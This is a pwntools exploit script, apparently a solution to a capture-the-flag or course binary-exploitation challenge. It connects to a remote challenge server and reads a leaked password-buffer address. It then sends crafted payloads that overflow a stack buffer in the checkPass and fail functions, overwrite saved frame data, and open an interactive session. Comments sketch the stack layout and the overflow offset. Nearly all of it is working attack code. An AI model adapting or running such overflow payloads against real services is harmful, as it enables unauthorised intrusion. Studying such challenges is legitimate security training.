from pwn import *

context.os = "linux"
context.arch = "amd64"



#               | saved rip
#               | saved ebp                               [ebx + 0x40] = malloc(0x2b) <- at the end it has content of password    = pass
#frame main     | saved ebx (ebp - 0x4)                   [ebx + 0x44] = buffer                                                   = inp
#               | ...                                     [ebx + 0x48] = fd open password                                         = pfd
#               | buffer[0x30] (ebp - 0x34)
#               | esp [ebp - 0x34]
# ----------------------------------
#               | saved rip                              [eax + 0x40] = pass
#               | saved ebp                              [eax + 0x44] = inp
# checkPass     |
#               |checkBuffer[0x18] (ebp-0x18)    -> THIS CAN BE OVERFLOWED IN FAIL 0x1d     0x1d - 0x18 = 0x 5
#               | esp [ebp . 0x18]
#------------------------------------
#               | saved rip
# fail          | saved ebp
#               | ebx
#

# Leave
# mov esp, ebp  ; Restore ESP (Stack Pointer) to the base of the current stack frame
# pop ebp        ; Restore the old EBP (previous stack frame)


P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 9998)
# P = process("./bin")
# P = gdb.debug("./bin", gdbscript= """
#         b *main+221
#         b *main+213
#         c""")


P.recvuntil(b"share: 0x")
leakPass = int(P.recvuntil(b"\n")[:-1].decode(),16)

print(hex(leakPass))

P.send((p32(0x0) + p32(leakPass) + p32(0x1)).ljust(0x2b, b"Z"))
P.send(b"\x00" + b"V"*0x17 + p32(leakPass + 0x1) + p8(0x15))
P.send(b"\x00") # + p32(leakPass + 0x18) + p8(0x1d))

P.interactive()